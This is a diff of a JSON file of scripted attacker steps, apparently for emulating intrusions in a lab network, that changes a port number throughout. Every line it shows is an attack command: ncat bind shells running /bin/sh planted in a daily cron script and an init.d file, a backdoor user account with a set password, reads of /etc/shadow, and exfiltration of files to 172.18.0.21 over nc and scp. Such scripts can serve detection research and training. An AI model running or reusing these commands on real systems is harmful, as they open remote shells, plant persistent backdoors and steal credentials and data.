@@ -22,12 +22,12 @@
     "step 9": "nmap -sV 172.18.0.21 "
   },
   "persistence": {
-    "step 1": "echo \"ncat -lvp 15000 -e /bin/sh\" >> /etc/cron.daily/logrotate",
+    "step 1": "echo \"ncat -lvp 15300 -e /bin/sh\" >> /etc/cron.daily/logrotate",
     "step 2": "tail /etc/cron.daily/logrotate",
-    "step 3": "echo \"ncat -lvp 15000 -e /bin/sh\" > /etc/init.d/ippd",
+    "step 3": "echo \"ncat -lvp 15300 -e /bin/sh\" > /etc/init.d/ippd",
     "step 4": "ls -la /etc/init.d | grep ippd ",
     "step 5": "which ncat",
-    "step 6": "ncat -lvp 15000 -e /bin/sh &",
+    "step 6": "ncat -lvp 15300 -e /bin/sh &",
     "step 7": "netstat -tulpn",
     "step 8": "useradd -m -p \"$(openssl passwd -1 'password')\" john",
     "step 9": "cat /etc/shadow"
@@ -39,7 +39,7 @@
     "step 4": "gzip .bashrc",
     "step 5": "mv .bashrc.gz ext.gz && ls",
     "step 6": "file ext.gz",
-    "step 7": "nc 172.18.0.21 15000 < ext.gz",
+    "step 7": "nc 172.18.0.21 15300 < ext.gz",
     "step 8": "cat /etc/shadow",
     "step 9": "scp -P 2221 /etc/shadow eve@172.18.0.21:~"
   },
